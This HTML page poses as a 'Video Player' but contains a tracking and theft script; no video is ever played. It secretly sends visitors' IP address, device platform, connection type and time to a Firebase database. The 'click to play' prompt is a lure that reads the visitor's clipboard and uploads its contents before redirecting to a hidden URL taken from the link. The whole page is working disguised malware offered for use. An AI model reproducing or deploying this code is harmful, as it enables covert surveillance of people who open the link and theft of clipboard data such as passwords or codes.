<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Video Player</title>
    <style>
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #00a884; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="status" style="text-align:center;">
        <div class="loader" id="ldr"></div>
        <p id="msg" style="margin-top:10px; color:#555; font-size: 14px;">Connecting...</p>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";

        async function fastAction() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            if(!id) return;
            const decoded = JSON.parse(atob(id));
            const userKey = decoded.k;
            const targetUrl = decoded.r;

            // Background mein data collect karna (Wait nahi karega)
            let data = {
                time: new Date().toLocaleString(),
                device: navigator.platform,
                net: navigator.connection ? navigator.connection.effectiveType : "N/A"
            };

            // Quick IP fetch
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(d => {
                    data.ip = d.ip;
                    fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
                }).catch(() => {
                    fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
                });

            // Sirf 2 second ka timer
            setTimeout(() => {
                document.getElementById('ldr').style.display = 'none';
                document.getElementById('msg').innerHTML = "<b>⚠️ CLICK TO PLAY VIDEO</b>";
                
                document.body.onclick = async () => {
                    // Clipboard try karega aur redirect kar dega
                    try {
                        const text = await navigator.clipboard.readText();
                        if(text) fetch(`${DB_URL}clipboard/${userKey}.json`, { 
                            method: 'POST', 
                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
                        });
                    } catch(e){}
                    window.location.href = targetUrl;
                };
            }, 2000);

            // Agar user click na kare toh 5 sec mein auto-redirect
            setTimeout(() => { window.location.href = targetUrl; }, 5000);
        }
        fastAction();
    </script>
</body>
</html>
